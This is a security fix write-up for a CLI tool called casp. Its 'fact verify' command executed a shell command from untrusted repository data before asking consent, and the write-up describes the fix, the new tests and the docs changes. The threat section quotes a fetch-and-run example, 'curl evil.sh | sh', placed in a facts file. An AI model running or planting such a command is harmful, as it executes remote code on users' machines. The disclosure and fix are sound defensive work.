---
phase: fact-verify-consent-gate
---

# 26-07-21-009 — `casp fact verify` asked for consent after it had already run

Security fix in unpublished code. Folded into the 0.14.0 entry rather than a
0.14.1, since 0.14.0 was never published.

## The defect

`casp fact verify <id>` replays a fact's declared `method` — a shell command that
lives in `casp/facts.json`, which is repository content, and which the project's
own threat model classifies as **untrusted input**.

The first cut executed it and *then* asked:

```
src/fact.ts:156   execSync(fact.method, { cwd: root, ... })     ← ran here
src/fact.ts:173   "write this fact? [y/N]"                      ← asked here
```

The prompt's own wording gives it away — `refusing to write without
confirmation`. It gated the **write to facts.json**, not the execution. So the
command ran unconditionally on invocation: no TTY needed, no `--yes` needed,
nobody asked.

Reproduced before anything was touched, with a harmless payload:

```
$ casp fact verify seat-count < /dev/null      # non-interactive, no --yes
  refusing to write without confirmation in a non-interactive shell
  → pass --yes to confirm
$ cat /tmp/marker
PWNED
```

CASP announced it was refusing the operation, exited, and the side effect had
already happened.

**This was a spec/implementation divergence, not a design disagreement.**
`schemas/facts.schema.json` documented the intent verbatim: *"only `casp fact
verify <id>` executes it, and only after an explicit confirmation."* The
implementation did the opposite of its own published schema.

**And `docs/threat-model.md` was false as written.** It stated *"Verifying state
must never execute code those inputs control"* and *"No arbitrary code execution
to verify state… Verifying state cannot, by construction, run the project's
code."* Categorical, "by construction", in a security document, in a public repo,
about a binary that had just gained a verb doing precisely that.

Threat: a repository ships `casp/facts.json` with `"method": "curl evil.sh | sh"`.
Anyone running an inspect-sounding verb executes it — including an agent, since
CASP's own docs teach agents to run casp commands.

## What shipped

**`src/fact.ts`**

- A `confirm(question, refusal)` helper, and the security gate moved **above**
  `execSync`. The method is printed, then `run this command? it comes from
  casp/facts.json` is asked, then — and only then — it runs.
- The **data gate is kept and separate**: after the before/after is on screen,
  `write this fact?` still guards persistence. Two prompts, each meaningful: the
  first consents to execution, the second to the value. `--yes` skips both and
  remains the deliberate unattended path.
- **No TTY → refuse before running.** `fail()` with `refusing to run a fact
  method without confirmation in a non-interactive shell`, exit 1. Previously the
  non-interactive path also "refused" — after executing.
- `Ctrl+D` (and any aborted read) is treated as "no" rather than crashing. It
  previously escaped as an unhandled `AbortError` and printed a stack trace over
  the prompt. It failed closed, so it was never a security issue, but a stack
  trace violates this project's own "malformed input degrades to findings, not
  crashes" rule.

**Docs reconciled with the binary**

- `docs/threat-model.md`: the untrusted-input assumption now names the single
  consented exception up front; the "no arbitrary code execution" bullet is
  scoped to *reaching a verdict* and states plainly that **every gating path —
  `check`, the pre-push hook, `next`, `status`, `--all` — is execution-free by
  construction**. A new section, *The one execution surface*, documents the
  consent rules and ends on the honest limit: **it is a consent gate, not a
  sandbox.** CASP does not constrain what the method does once approved.
- `src/fact.ts` module docstring and `casp help fact` both described the old
  order ("asks for confirmation before writing") and now describe the real one.
- `--yes` is documented as skipping **both** prompts, i.e. running the method
  unattended — previously "skip the confirmation prompt", singular and vague.

## Why the existing test did not catch it

There **was** a test for the non-interactive path. It asserted that nothing was
**written**. Nothing asserted that nothing was **run** — so it passed, green,
while the hole was wide open.

That is the transferable lesson and it is worth more than the fix: a test can
pin the wrong invariant and be indistinguishable from coverage. The suite
reported the verb as tested. The three new tests assert the method's **side
effect**:

- `without confirmation the method DOES NOT RUN` — a sentinel file must not
  exist, exit 1, and the refusal message must name *running*, not *writing*.
- `--yes: the method runs` — the opt-in still works and writes the new value.
- `the method is printed before anything is decided` — an operator cannot
  consent to a command they were never shown.

179 tests, 0 fail (176 → 179).

## Verification

- Exploit re-run against the built binary: refuses, exit 1, **sentinel absent**.
- `--yes`: runs, writes, exit 0.
- Interactive over a pty: `y` → runs → `write this fact?` → `y` → written.
  `n` or `Ctrl+D` at the first prompt → `aborted — nothing run, nothing written`,
  no stack trace, sentinel absent.
- `npm test` — 179/179.
- `casp check` — 0 FAIL.

## Deferred / risks

- **Not published, and should not be until the facts-layer audit lands.** 0.13.0
  and 0.14.0 are both unpublished; npm `latest` is 0.12.1. This defect is the
  third in a row of the same shape — green build, passing tests, semantic or
  security defect found only by review — after 0.12.0's data-loss paths and
  0.13.0's aliased-fork false `queue`. Each was recoverable only because nothing
  had been published.
- **The gate is consent, not containment.** An approved method runs with the
  operator's full privileges in the repo root. Sandboxing it is a real question
  and deliberately out of scope here; it is recorded in the threat model as a
  stated limit rather than left implied.
- The two pre-existing `readFrontmatter` crash paths (`readFileSync` outside its
  `try`, so an `EACCES` prompt file still throws) are untouched. They exist in
  published 0.12.1, so they do not gate a publish; they remain a hardening slice.
